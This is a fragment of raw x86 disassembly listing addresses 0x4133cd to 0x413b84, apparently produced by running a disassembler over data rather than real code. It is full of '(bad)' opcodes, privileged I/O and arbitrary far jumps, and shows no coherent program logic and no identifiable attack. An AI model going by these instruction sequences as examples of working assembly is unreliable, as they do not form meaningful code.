  4133cd:	fstp   TBYTE PTR [esi+edx*2]
  4133d0:	(bad)  
  4133d1:	aam    0x6a
  4133d3:	xor    al,0x44
  4133d5:	pop    ss
  4133d6:	outs   dx,BYTE PTR ds:[esi]
  4133d7:	cmc    
  4133d8:	in     al,0x39
  4133da:	shl    BYTE PTR [esi],cl
  4133dc:	rol    bh,1
  4133de:	sbb    eax,0x45d0d0c
  4133e3:	pop    es
  4133e4:	(bad)  
  4133e5:	pop    ebx
  4133e6:	sbb    esi,DWORD PTR [ebp+0x66e1c853]
  4133ec:	call   0xa4068737
  4133f1:	jne    0x4133af
  4133f3:	jmp    0x270fc22
  4133f8:	pushf  
  4133f9:	push   esp
  4133fa:	pushf  
  4133fb:	icebp  
  4133fc:	shr    esi,0x60
  4133ff:	inc    eax
  413400:	out    0xf4,eax
  413402:	ins    DWORD PTR es:[edi],dx
  413403:	pop    edx
  413404:	fbld   TBYTE PTR [ebx]
  413406:	cs xor al,0x95
  413409:	std    
  41340a:	cmc    
  41340b:	shl    BYTE PTR [edx+esi*8+0x31],0x69
  413410:	jp     0x413465
  413412:	push   esp
  413413:	mov    ah,0xcb
  413415:	jno    0x413435
  413417:	xor    bl,BYTE PTR [edx-0x41fbddde]
  41341d:	(bad)  
  41341f:	or     bl,al
  413421:	aas    
  413422:	jbe    0x4133c3
  413424:	xlat   BYTE PTR ds:[ebx]
  413425:	(bad)  
  413426:	sub    al,0xe6
  413428:	push   esp
  413429:	scas   eax,DWORD PTR es:[edi]
  41342a:	out    dx,eax
  41342b:	mov    al,0x30
  41342d:	xor    eax,0x3b234e35
  413432:	push   ds
  413433:	test   DWORD PTR [edi+0x4521e6eb],eax
  413439:	adc    DWORD PTR [ecx],0xb
  41343c:	inc    edi
  41343d:	and    DWORD PTR [ebx],edi
  41343f:	or     al,0x3
  413441:	sub    dh,BYTE PTR [edi-0x33850361]
  413447:	(bad)  
  413448:	fist   WORD PTR [edi-0x2e]
  41344b:	mov    esp,ds
  41344d:	push   ebx
  41344e:	and    DWORD PTR es:0xcf18e50d,eax
  413455:	gs or  eax,0x88d7f117
  41345b:	daa    
  41345c:	fdivrp st(1),st
  41345e:	bound  ecx,QWORD PTR [ebx+0x1a]
  413461:	out    dx,al
  413462:	iret   
  413463:	sub    esi,edx
  413465:	mov    WORD PTR [eax-0x1927ddbf],ds
  41346b:	xchg   esi,eax
  41346c:	mov    WORD PTR [edx],ss
  41346e:	and    al,0xb5
  413470:	ficom  WORD PTR [eax-0x185cc576]
  413476:	mov    bl,0xd5
  413478:	mov    dh,0x34
  41347a:	mov    WORD PTR [esi-0x7b],cs
  41347d:	ss jne 0x413450
  413480:	(bad)  
  413482:	mov    esi,0x5a9f62cf
  413487:	sbb    edi,DWORD PTR [ecx]
  413489:	push   ecx
  41348a:	dec    ecx
  41348b:	js     0x413499
  41348d:	rcl    BYTE PTR [edi-0x62e912a5],1
  413493:	sub    cl,BYTE PTR [ebx+0x32]
  413496:	pushf  
  413497:	and    DWORD PTR fs:[edi+0x65],esi
  41349b:	les    esi,FWORD PTR [ebx+0x1851a6eb]
  4134a1:	adc    ah,BYTE PTR ds:0xc6537505
  4134a7:	push   ebp
  4134a8:	mov    esi,0x1cd9f7fe
  4134ad:	sub    al,0x82
  4134af:	dec    ebp
  4134b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b1:	(bad)  
  4134b2:	stos   BYTE PTR es:[edi],al
  4134b3:	add    eax,0x6fe06c53
  4134b8:	shr    DWORD PTR [edx-0x75e9e98],0x3e
  4134bf:	and    cl,bh
  4134c1:	pushf  
  4134c2:	(bad)  
  4134c3:	out    dx,al
  4134c4:	add    al,0xe
  4134c6:	or     dh,0x66
  4134c9:	addr16 out 0x56,al
  4134cc:	jno    0x413466
  4134ce:	mov    edx,edx
  4134d0:	sub    DWORD PTR [ebp-0x6670cb13],0xffffffcd
  4134d7:	sbb    DWORD PTR [eax+0x66cc9b69],ebx
  4134dd:	and    bh,al
  4134df:	stos   DWORD PTR es:[edi],eax
  4134e0:	or     ah,0xaf
  4134e3:	lock inc edi
  4134e5:	mov    edx,0x285bcd93
  4134ea:	inc    edx
  4134eb:	ins    BYTE PTR es:[edi],dx
  4134ec:	mov    dh,0xd9
  4134ee:	and    ah,BYTE PTR ds:0xc0e7aaf0
  4134f4:	xchg   dl,ch
  4134f6:	sbb    cl,bl
  4134f8:	xchg   edx,eax
  4134f9:	mov    BYTE PTR [ebx],0x35
  4134fc:	jno    0x4134aa
  4134fe:	sub    DWORD PTR [eax+ecx*2+0x41],esp
  413502:	sbb    DWORD PTR [eax+0x224062d8],ebp
  413508:	sbb    dl,BYTE PTR [ecx+0x1df2d87c]
  41350e:	xor    BYTE PTR [edi-0x6b],cl
  413511:	sar    ebp,cl
  413513:	clc    
  413514:	fcomp  QWORD PTR [ebp-0x78a9496f]
  41351a:	sbb    ecx,DWORD PTR [ecx+0x20608993]
  413520:	popf   
  413521:	jg     0x41357f
  413523:	lock inc esi
  413525:	aad    0xb5
  413527:	add    cl,cl
  413529:	imul   esi,DWORD PTR ds:0xa0f1b9fb,0xa663b29a
  413533:	xor    eax,0x29dd83c
  413538:	inc    esi
  413539:	pop    ss
  41353a:	or     ah,ch
  41353c:	xchg   ebx,eax
  41353d:	mov    esp,0x14922d47
  413542:	pushf  
  413543:	std    
  413544:	repz scas eax,DWORD PTR es:[edi]
  413546:	dec    esp
  413547:	push   edx
  413548:	push   edi
  413549:	les    ebx,FWORD PTR [ecx]
  41354b:	cli    
  41354c:	mov    ecx,0x7dda71ec
  413551:	pop    esp
  413552:	dec    ecx
  413553:	dec    BYTE PTR [ebp-0x1b]
  413556:	std    
  413557:	xchg   edx,eax
  413558:	pop    esp
  413559:	add    al,BYTE PTR [eax]
  41355b:	inc    edi
  41355c:	jl     0x4134fc
  41355e:	shr    BYTE PTR [ebx-0xd],cl
  413561:	adc    BYTE PTR [esi-0x78],dh
  413564:	pop    ds
  413565:	(bad)
  413568:	push   0x33
  41356a:	sahf   
  41356b:	test   eax,0x26d1b308
  413570:	push   ds
  413571:	mov    ah,0x99
  413573:	and    BYTE PTR [ecx],0xb1
  413576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413577:	mov    cl,0x6c
  413579:	mov    ah,0xd6
  41357b:	mov    eax,ds:0xf1a83903
  413580:	xor    bl,al
  413582:	mov    dh,0xa1
  413584:	lock cmp DWORD PTR [ecx+0x79],0xffffffef
  413589:	dec    esi
  41358a:	adc    dh,BYTE PTR fs:[ebp+0x2f]
  41358e:	add    al,0x43
  413590:	adc    BYTE PTR [esi-0x53e08819],dh
  413596:	mov    esi,0x8f31aec0
  41359b:	mov    ebp,ds
  41359d:	lods   eax,DWORD PTR ds:[esi]
  41359e:	leave  
  41359f:	push   edx
  4135a0:	mov    edx,0x276c99b3
  4135a5:	outs   dx,DWORD PTR ds:[esi]
  4135a6:	lahf   
  4135a7:	sub    cl,BYTE PTR [edx-0x45]
  4135aa:	pop    edx
  4135ab:	fsubr  QWORD PTR [edx-0x2e]
  4135ae:	test   eax,0x5267cec2
  4135b3:	jbe    0x413625
  4135b5:	fs pop es
  4135b7:	adc    DWORD PTR [ebx],0x3a8975b8
  4135bd:	and    BYTE PTR [eax-0x244fbcab],al
  4135c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135c4:	pop    ds
  4135c5:	cmp    DWORD PTR [ebx+0x4187f14c],esi
  4135cb:	popa   
  4135cc:	and    edi,DWORD PTR [ecx-0x54e7a99a]
  4135d2:	hlt    
  4135d3:	adc    ebp,0x68
  4135d6:	(bad)  
  4135d7:	mov    esp,0x2957b495
  4135dc:	inc    ecx
  4135dd:	mov    ebx,0x82ba8090
  4135e2:	(bad)  
  4135e3:	pop    ss
  4135e4:	icebp  
  4135e5:	in     eax,dx
  4135e6:	jp     0x413598
  4135e8:	xlat   BYTE PTR ds:[ebx]
  4135e9:	xor    al,0xd7
  4135eb:	je     0x413590
  4135ed:	and    eax,0x8d4aa86a
  4135f2:	je     0x413603
  4135f4:	nop
  4135f5:	jo     0x413671
  4135f7:	and    bh,BYTE PTR [bx+si]
  4135fa:	rcl    DWORD PTR [ebx+0x36],cl
  4135fd:	mov    edi,esp
  4135ff:	invd   
  413601:	out    dx,al
  413602:	add    DWORD PTR [esi-0x30],ebp
  413605:	repz test eax,0x89bd63dc
  41360b:	mov    ebx,0xcfa06a01
  413610:	test   eax,0x76070c1
  413615:	jmp    0x45c8:0xf3f55bf1
  41361c:	dec    eax
  41361d:	xor    al,0x9f
  41361f:	mov    eax,ds:0xad3aeb4f
  413624:	out    0x2b,eax
  413626:	adc    al,0xd0
  413628:	lods   eax,DWORD PTR ds:[esi]
  413629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41362a:	idiv   DWORD PTR [ecx]
  41362c:	mov    ?,WORD PTR [ebx+esi*2-0x5510f7a8]
  413633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413634:	sbb    eax,esi
  413636:	es ins DWORD PTR es:[edi],dx
  413638:	mov    esp,0x458bda46
  41363d:	mov    eax,0xfbc4d8b
  413642:	lods   al,BYTE PTR ds:[esi]
  413643:	enter  0xc102,0xe9
  413647:	add    cl,BYTE PTR [ebx+0x558bb84d]
  41364d:	mov    esp,0x85e9c733
  413652:	add    eax,0xd7b0000
  413657:	les    edi,FWORD PTR [ebx+0x4c78b338]
  41365d:	jle    0x413689
  41365f:	nop
  413660:	outs   dx,BYTE PTR ds:[esi]
  413661:	mov    bl,0x5
  413663:	sti    
  413664:	mov    ah,0xdd
  413666:	cld    
  413667:	or     al,0x16
  413669:	cmp    eax,0xc9161604
  41366e:	sti    
  41366f:	jle    0x413656
  413671:	pop    ebx
  413672:	jl     0x4136e4
  413674:	ja     0x41365a
  413676:	jne    0x413683
  413678:	call   FWORD PTR [esi]
  41367a:	popa   
  41367b:	stos   BYTE PTR es:[edi],al
  41367c:	pop    edi
  41367d:	and    esp,esi
  41367f:	jae    0x4136bb
  413681:	and    al,BYTE PTR [esi]
  413683:	pop    ebx
  413684:	sbb    esp,DWORD PTR [eax+0x58dfb4f2]
  41368a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41368b:	fidiv  WORD PTR [ebp+0x27]
  41368e:	jnp    0x4136d7
  413690:	div    esi
  413692:	js     0x41364c
  413694:	add    al,0x4f
  413696:	and    bl,bh
  413698:	fmul   st,st(0)
  41369a:	inc    edi
  41369b:	xchg   esp,eax
  41369c:	mov    cl,0x54
  41369e:	fdivr  QWORD PTR [ecx+0x70]
  4136a1:	inc    ebp
  4136a2:	fwait
  4136a3:	jae    0x413638
  4136a5:	bound  ebx,QWORD PTR [ebx+0x66]
  4136a8:	outs   dx,BYTE PTR ds:[esi]
  4136a9:	shl    BYTE PTR [esi-0x7b0ab61e],cl
  4136af:	dec    ebp
  4136b0:	fcomp  QWORD PTR ds:[esi+0x4849aeb4]
  4136b7:	dec    ecx
  4136b8:	xchg   ecx,eax
  4136b9:	sub    eax,0x64028a82
  4136be:	mov    ebp,0x13b64f27
  4136c3:	mov    bh,0x85
  4136c5:	mov    bl,0xbd
  4136c7:	xor    BYTE PTR [ebx+0x63],dl
  4136ca:	gs scas al,BYTE PTR es:[edi]
  4136cc:	sbb    BYTE PTR [eax-0x1f],bl
  4136cf:	xchg   edi,eax
  4136d0:	mov    ebp,0x73d0d90d
  4136d5:	mov    dh,BYTE PTR ds:0x457bb9d6
  4136db:	out    0x11,eax
  4136dd:	jge    0x41368a
  4136df:	mov    ecx,0x66d7d413
  4136e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e5:	cli    
  4136e6:	add    esi,DWORD PTR [esi]
  4136e8:	mov    al,ds:0xd491c1c3
  4136ed:	cdq    
  4136ee:	(bad)  
  4136ef:	xor    ah,ch
  4136f1:	mov    WORD PTR [edi],gs
  4136f3:	out    0x98,eax
  4136f5:	ret    0x4c0
  4136f8:	jbe    0x4136aa
  4136fa:	mov    ds:0x2e3f6ca4,eax
  4136ff:	push   cs
  413700:	and    DWORD PTR [ecx-0x31],edi
  413703:	push   ebp
  413704:	fistp  DWORD PTR [ebp+0x7b]
  413707:	mov    eax,ds:0x50c1a777
  41370c:	enter  0x6cba,0x25
  413710:	push   0xffffff9c
  413712:	inc    edx
  413713:	rol    eax,cl
  413715:	or     DWORD PTR [edi-0x3c],eax
  413718:	scas   eax,DWORD PTR es:[edi]
  413719:	(bad)  
  41371b:	mov    WORD PTR ds:0x7f02d6ed,cs
  413721:	shl    al,cl
  413723:	cmp    DWORD PTR [edi],esp
  413725:	xchg   esp,eax
  413726:	dec    eax
  413727:	mov    BYTE PTR [ecx+eax*8+0x1a],cl
  41372b:	les    esp,FWORD PTR [edx+ebp*4+0x43]
  41372f:	push   edi
  413730:	test   al,0x95
  413732:	pushf  
  413733:	std    
  413734:	fisubr WORD PTR [edx+0x2282be19]
  41373a:	xor    DWORD PTR [eax+0x1790b1a],0x63380ddd
  413744:	push   cs
  413745:	pop    es
  413746:	(bad)  
  413747:	retf   
  413748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413749:	mov    al,0x3b
  41374b:	(bad)  
  41374c:	mov    edi,0xfd83ff3
  413751:	lahf   
  413752:	neg    BYTE PTR [edx+ecx*2+0x40]
  413756:	xchg   ebp,eax
  413757:	test   esi,0xe1506dcb
  41375d:	ret    
  41375e:	cmp    BYTE PTR [eax+0x72fc8db3],ah
  413764:	pop    esi
  413765:	cmp    eax,0xd1951bd5
  41376a:	sub    edx,DWORD PTR [edx]
  41376c:	sub    DWORD PTR [edx-0xd],ebp
  41376f:	cwde   
  413770:	imul   ebx,ebx,0x61e936ce
  413776:	xchg   esi,eax
  413777:	xor    BYTE PTR [ebx],cl
  413779:	mov    esi,0x448b1281
  41377f:	outs   dx,BYTE PTR ds:[esi]
  413780:	push   esi
  413781:	push   ebp
  413782:	and    DWORD PTR [esi],eax
  413784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413785:	cdq    
  413786:	rcl    eax,1
  413788:	xor    al,BYTE PTR [edx+0x77]
  41378b:	cmp    al,0x47
  41378d:	sbb    al,BYTE PTR [esi-0x61]
  413790:	or     eax,0xcdb99
  413795:	push   edx
  413796:	mov    eax,ds:0x7d960ad0
  41379b:	mov    ch,0xf5
  41379d:	xor    al,0xd9
  41379f:	adc    cl,BYTE PTR [eax-0x5eb77760]
  4137a5:	ins    DWORD PTR es:[edi],dx
  4137a6:	fiadd  WORD PTR [esi+0xd]
  4137a9:	mov    bh,0x71
  4137ab:	pop    esi
  4137ac:	push   edi
  4137ad:	lods   al,BYTE PTR ds:[esi]
  4137ae:	das    
  4137af:	fucomp st(4)
  4137b1:	push   esi
  4137b2:	cmc    
  4137b3:	mov    ebx,0xfef4e64e
  4137b8:	pop    ss
  4137b9:	(bad)  
  4137ba:	popa   
  4137bb:	mov    ebp,0xb3e336d9
  4137c0:	std    
  4137c1:	mov    ch,0xbd
  4137c3:	idiv   DWORD PTR [edi+0x5b]
  4137c6:	mov    ebx,0xa338a326
  4137cb:	data16 mov ch,0x74
  4137ce:	aas    
  4137cf:	add    al,BYTE PTR [ebp-0x7e]
  4137d2:	icebp  
  4137d3:	pop    ebp
  4137d4:	out    dx,eax
  4137d5:	test   DWORD PTR [ebx+0x28],0xa3121c2d
  4137dc:	mov    al,cs:0xd56e286f
  4137e2:	sbb    edi,ebx
  4137e4:	or     edx,DWORD PTR [ecx+edx*1+0x5ee64195]
  4137eb:	xlat   BYTE PTR ds:[ebx]
  4137ec:	pop    esi
  4137ed:	fldcw  WORD PTR [esi-0x72]
  4137f0:	es jp  0x413788
  4137f3:	sbb    eax,0x2717d0be
  4137f8:	(bad)  
  4137fb:	jmp    0x413786
  4137fd:	dec    edx
  4137fe:	imul   BYTE PTR [edx+0x78]
  413801:	push   edi
  413802:	or     eax,0xbe8f136
  413807:	ficom  DWORD PTR [ecx]
  413809:	leave  
  41380a:	adc    eax,0x7e513da6
  41380f:	adc    BYTE PTR [ebp-0xb],al
  413812:	xchg   ebx,eax
  413813:	cmc    
  413814:	xor    ecx,edi
  413816:	js     0x41382f
  413818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413819:	xchg   esi,eax
  41381a:	ror    DWORD PTR [edi],1
  41381c:	das    
  41381d:	cwde   
  41381e:	or     ebp,ecx
  413820:	cmc    
  413821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413822:	mov    edi,edx
  413824:	aaa    
  413825:	dec    ebp
  413826:	sub    bl,BYTE PTR [edx-0x6b]
  413829:	rcr    BYTE PTR es:[edi+0x27],cl
  41382d:	cmp    edi,0x5ecf7bab
  413833:	xchg   edx,eax
  413834:	stc    
  413835:	retf   0x4d05
  413838:	xchg   esp,eax
  413839:	fsub   QWORD PTR [esi]
  41383b:	jecxz  0x4138a5
  41383d:	push   esp
  41383e:	dec    sp
  413840:	cs mov ch,0x1d
  413843:	or     BYTE PTR [edi-0x3bdccfdf],ch
  413849:	push   0xffffffce
  41384b:	mov    dh,0xb
  41384d:	loope  0x413899
  41384f:	or     eax,0x390b91fb
  413854:	(bad)  
  413855:	sbb    BYTE PTR [ebx],ah
  413857:	pop    ds
  413858:	test   eax,0x303bbd82
  41385d:	mov    ecx,0x6ecaee23
  413862:	fwait
  413863:	les    ebx,FWORD PTR [edx+0x14e29a99]
  413869:	test   BYTE PTR [esi],al
  41386b:	push   0x70
  41386d:	xchg   ebx,eax
  41386e:	jmp    0x413891
  413870:	add    al,0x12
  413872:	sar    BYTE PTR ss:[ecx-0x1b20e7bf],0x44
  41387a:	xchg   edi,eax
  41387b:	push   ss
  41387c:	xchg   edx,eax
  41387d:	mov    ecx,0x35b31f44
  413882:	ins    DWORD PTR es:[edi],dx
  413883:	es mov edx,0x7f5d3228
  413889:	dec    ebx
  41388a:	or     al,0x19
  41388c:	xchg   ebx,eax
  41388d:	pop    ds
  41388e:	pop    ss
  41388f:	rcr    bl,cl
  413891:	enter  0x7732,0x7f
  413895:	lahf   
  413896:	shr    DWORD PTR [esi-0x17],cl
  413899:	cmp    al,0xdd
  41389b:	push   ds
  41389c:	jo     0x4138f7
  41389e:	cmp    al,0x1c
  4138a0:	cmp    eax,eax
  4138a2:	mov    DWORD PTR [ebp+0x1],ecx
  4138a5:	push   esi
  4138a6:	adc    edx,edx
  4138a8:	fcomp  st(6)
  4138aa:	cs mov dl,0xd2
  4138ad:	(bad)  
  4138ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138af:	sbb    BYTE PTR [ebx+0x25],dl
  4138b2:	pop    edx
  4138b3:	xchg   ebx,eax
  4138b4:	mov    al,ds:0x40ffdc14
  4138b9:	and    dl,BYTE PTR [ebp-0x7a0d6377]
  4138bf:	add    BYTE PTR [esi-0x5266dbbe],bl
  4138c5:	mov    eax,ds:0x7a9166f1
  4138ca:	repz pop ebx
  4138cc:	and    BYTE PTR [ebx],ah
  4138ce:	sub    al,0xd2
  4138d0:	jnp    0x41385a
  4138d2:	(bad)  
  4138d3:	jmp    0x4138f5
  4138d5:	ror    al,cl
  4138d7:	xchg   BYTE PTR [edi-0x49],dl
  4138da:	push   esi
  4138db:	call   0xfc549c9d
  4138e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138e1:	and    al,BYTE PTR [esp+eax*1-0x30]
  4138e5:	cmovne ebx,DWORD PTR [edi+0x8379998]
  4138ec:	dec    ebp
  4138ed:	test   cl,dl
  4138ef:	mov    bl,0x75
  4138f1:	pop    ds
  4138f2:	mov    WORD PTR [esi],ss
  4138f4:	mov    dl,BYTE PTR [esi-0x6]
  4138f7:	int    0x81
  4138f9:	pop    ebx
  4138fa:	popa   
  4138fb:	xchg   DWORD PTR [eax+0x14],eax
  4138fe:	stc    
  4138ff:	lds    ecx,FWORD PTR [ebx]
  413901:	cdq    
  413902:	jns    0x413919
  413904:	in     al,0x80
  413906:	push   ebp
  413907:	shl    DWORD PTR [eax],cl
  413909:	jmp    0x1aec6ded
  41390e:	jp     0x4138de
  413910:	add    al,0x6e
  413912:	call   0x65802dc1
  413917:	and    al,0xfb
  413919:	jae    0x413940
  41391b:	cmp    al,0x1b
  41391d:	ret    
  41391e:	xlat   BYTE PTR ds:[ebx]
  41391f:	aad    0xb6
  413921:	sub    bh,ch
  413923:	ja     0x4138af
  413925:	mov    ebp,0x3fc439b9
  41392a:	adc    DWORD PTR [eax-0x5f],ebp
  41392d:	popa   
  41392e:	rcl    DWORD PTR [esi],cl
  413930:	cmp    al,0x27
  413932:	pop    es
  413933:	lds    ebx,FWORD PTR [edi-0x5bb602d8]
  413939:	hlt    
  41393a:	call   0xa113c45a
  41393f:	dec    edi
  413940:	add    DWORD PTR [esi-0x59972797],edx
  413946:	dec    ebp
  413947:	or     edx,DWORD PTR [esi-0x47ee01c2]
  41394d:	dec    ebx
  41394e:	mov    ah,0x2
  413950:	add    ch,BYTE PTR [ebx+esi*2-0x51]
  413954:	or     DWORD PTR [bp+si+0x2dce],ebp
  413959:	adc    DWORD PTR [eax+0x54],esi
  41395c:	loop   0x41393b
  41395e:	cmp    eax,0x1ea47f6a
  413963:	xor    al,0xd
  413965:	pop    ecx
  413966:	scas   al,BYTE PTR es:[edi]
  413967:	push   eax
  413968:	mov    dh,0xcd
  41396a:	dec    esi
  41396b:	mov    ds,WORD PTR [ebp+0x47]
  41396e:	cmp    eax,DWORD PTR [esi+eiz*4+0x1c]
  413972:	fistp  QWORD PTR [ebp+0x44720a49]
  413978:	jae    0x413906
  41397a:	mov    BYTE PTR [ecx+0x346d736e],dl
  413980:	xchg   bl,ah
  413982:	mov    eax,0x287a118
  413987:	cmovb  ecx,DWORD PTR [edi]
  41398a:	ret    
  41398b:	shr    DWORD PTR [esi-0x505ccfc1],1
  413991:	loope  0x41395d
  413993:	xchg   ecx,eax
  413994:	push   ds
  413995:	aas    
  413996:	push   eax
  413997:	aaa    
  413998:	cmp    DWORD PTR ds:0xa5ba4627,ebp
  41399e:	and    bl,BYTE PTR [edx-0x13]
  4139a1:	or     DWORD PTR [esi-0x7c],0x9352b030
  4139a8:	or     DWORD PTR [edx],ecx
  4139aa:	mov    ah,0x7a
  4139ac:	jge    0x4139ce
  4139ae:	imul   ebx,DWORD PTR [ebx+0x7c56bc3b],0x17
  4139b5:	or     DWORD PTR [esi],ecx
  4139b7:	jnp    0x413944
  4139b9:	jae    0x4139e7
  4139bb:	jge    0x413985
  4139bd:	sti    
  4139be:	icebp  
  4139bf:	push   esp
  4139c0:	adc    BYTE PTR [esi-0x23],ch
  4139c3:	or     dh,bh
  4139c5:	mov    ds:0x6547bade,al
  4139ca:	(bad)  
  4139cb:	jmp    0xc5a8:0xb616f5dc
  4139d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139d3:	fnstenv [eax]
  4139d5:	stc    
  4139d6:	dec    ecx
  4139d7:	js     0x4139f6
  4139d9:	xchg   esi,eax
  4139da:	or     ebp,esp
  4139dc:	lods   eax,DWORD PTR ds:[esi]
  4139dd:	sub    al,0x68
  4139df:	sub    BYTE PTR [esi],ah
  4139e1:	dec    eax
  4139e2:	stos   DWORD PTR es:[edi],eax
  4139e3:	cmp    esp,DWORD PTR [edi+0x4b76e088]
  4139e9:	mov    ebp,0xac491b95
  4139ee:	std    
  4139ef:	loop   0x413a40
  4139f1:	xlat   BYTE PTR ds:[ebx]
  4139f2:	push   cs
  4139f3:	push   edi
  4139f4:	jne    0x4139c8
  4139f6:	pop    esi
  4139f7:	dec    ebx
  4139f8:	(bad)  
  4139f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139fa:	sub    eax,0x414f3a5d
  4139ff:	imul   BYTE PTR [edi-0x474a8824]
  413a05:	or     bl,bl
  413a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a08:	scas   al,BYTE PTR es:[edi]
  413a09:	jmp    0x2a1681a0
  413a0e:	mov    esi,0x7eefa5fb
  413a13:	scas   eax,DWORD PTR es:[edi]
  413a14:	xchg   edx,eax
  413a15:	mov    al,ds:0x7bd282e6
  413a1a:	lock sub BYTE PTR [ecx],bl
  413a1d:	repz cmp DWORD PTR [edi+0x7d6fa94a],ebp
  413a24:	cli    
  413a25:	iret   
  413a26:	sbb    al,0xf5
  413a28:	and    eax,0x29cca42a
  413a2d:	jb     0x413a3c
  413a2f:	sti    
  413a30:	mov    dl,0x8
  413a32:	mov    al,BYTE PTR [edx]
  413a34:	jae    0x4139e6
  413a36:	(bad)  
  413a37:	leave  
  413a38:	pop    es
  413a39:	ins    DWORD PTR es:[edi],dx
  413a3a:	call   0x2d57:0x80a68984
  413a41:	mov    DWORD PTR [ecx-0x246c4a40],ebx
  413a47:	dec    edx
  413a48:	dec    esp
  413a49:	mov    al,0x6
  413a4b:	call   0xfbeaa13d
  413a50:	cmp    BYTE PTR ds:0xa24f9ac7,ah
  413a56:	inc    edx
  413a57:	sub    BYTE PTR [edi+ebp*8-0x70b2452d],al
  413a5e:	fnstenv [ecx+edi*4]
  413a61:	mov    ch,BYTE PTR [ebx-0x3d]
  413a64:	in     eax,dx
  413a65:	and    BYTE PTR [ebx+ebx*2+0x59],bl
  413a69:	gs scas al,BYTE PTR es:[edi]
  413a6b:	retf   0xa599
  413a6e:	xlat   BYTE PTR ds:[ebx]
  413a6f:	adc    esp,DWORD PTR [edx+0xea8d2d0]
  413a75:	sbb    edx,ebp
  413a77:	(bad)  
  413a78:	push   ds
  413a79:	adc    DWORD PTR [ebx+0x4ff7cfa9],edx
  413a7f:	pop    ebp
  413a80:	popf   
  413a81:	add    esp,edx
  413a83:	mov    gs,WORD PTR [ebx-0x67]
  413a86:	test   eax,0xc4a9b5b5
  413a8b:	imul   ebx,DWORD PTR [esi+0x65076588],0x346aa6be
  413a95:	xor    ecx,edi
  413a97:	fistp  QWORD PTR [ecx-0x38]
  413a9a:	test   DWORD PTR [ecx+0x5f53ddc1],esi
  413aa0:	dec    esp
  413aa1:	sub    eax,0x20d9698c
  413aa6:	sar    BYTE PTR [ecx-0x51fe6306],cl
  413aac:	shl    edi,1
  413aae:	mov    ch,dh
  413ab0:	in     al,0x3c
  413ab2:	mov    ch,0xf1
  413ab4:	inc    ebx
  413ab5:	fdivr  DWORD PTR [ebx]
  413ab7:	(bad)  
  413ab9:	cmp    edx,ecx
  413abb:	enter  0xb3cf,0x4a
  413abf:	mov    dl,0x3b
  413ac1:	inc    eax
  413ac2:	dec    ebx
  413ac3:	sbb    al,0x85
  413ac5:	ins    BYTE PTR es:[edi],dx
  413ac6:	fild   DWORD PTR [edi-0x6238438a]
  413acc:	(bad)  
  413acd:	xchg   ebx,eax
  413ace:	pop    es
  413acf:	xchg   edi,eax
  413ad0:	popa   
  413ad1:	mov    ds:0xbe514ec0,al
  413ad6:	xor    eax,0xb02d9cff
  413adb:	pop    ss
  413adc:	dec    ebx
  413add:	push   0xfe187fa5
  413ae2:	jne    0x413b5b
  413ae4:	xor    dl,dh
  413ae6:	jo     0x413aa4
  413ae8:	jl     0x413abc
  413aea:	jmp    0x413b31
  413aec:	sahf   
  413aed:	pop    ds
  413aee:	test   al,0x9
  413af0:	pop    ebx
  413af1:	mov    ebx,ebp
  413af3:	fld    TBYTE PTR [eax-0x6c]
  413af6:	cmp    bl,cl
  413af8:	xchg   esi,eax
  413af9:	inc    esi
  413afa:	inc    eax
  413afb:	cld    
  413afc:	dec    esp
  413afd:	adc    DWORD PTR [eax+0x67],edx
  413b00:	mov    edi,0xfe3c2924
  413b05:	imul   ebx,edi,0xffffffe5
  413b08:	into   
  413b09:	add    dl,cl
  413b0b:	dec    eax
  413b0c:	mov    eax,0x9f59dc5d
  413b11:	ror    ah,cl
  413b13:	arpl   di,sp
  413b15:	mov    edi,0x504a9498
  413b1a:	dec    edx
  413b1b:	xchg   dl,dl
  413b1d:	jl     0x413b1d
  413b1f:	cdq    
  413b20:	dec    ebx
  413b21:	push   ebp
  413b22:	mov    ebx,ebx
  413b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b25:	inc    esp
  413b26:	pop    ds
  413b27:	mov    ds,WORD PTR [ebx+0xd9a1f8d]
  413b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b2e:	jae    0x413b36
  413b30:	loopne 0x413ab8
  413b32:	retf   0xb11b
  413b35:	cld    
  413b36:	pusha  
  413b37:	mov    BYTE PTR cs:[eax-0x59],bh
  413b3b:	mul    BYTE PTR [edi-0x1a170762]
  413b41:	das    
  413b42:	div    bh
  413b44:	cli    
  413b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b46:	push   ebp
  413b47:	mov    BYTE PTR ds:0x22d05a9c,0x49
  413b4e:	enter  0x2375,0xc8
  413b52:	mov    ecx,0x7c8444f1
  413b57:	xchg   ebp,eax
  413b58:	loope  0x413bcd
  413b5a:	test   eax,0x3bbc6b9
  413b5f:	add    DWORD PTR [ebp+0x55],edi
  413b62:	push   es
  413b63:	js     0x413b15
  413b65:	pop    esp
  413b66:	adc    eax,0xe57de2d3
  413b6b:	pop    ds
  413b6c:	aam    0xa6
  413b6e:	dec    edi
  413b6f:	inc    edi
  413b70:	addr16 je 0x413b1d
  413b73:	mov    edx,0x60c47225
  413b78:	sbb    ah,BYTE PTR [edx]
  413b7a:	cmp    DWORD PTR [esi+0x40],edx
  413b7d:	xor    edx,DWORD PTR [edi+0x7a]
  413b80:	fisub  DWORD PTR [eax]
  413b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b83:	dec    ebx
  413b84:	int3   
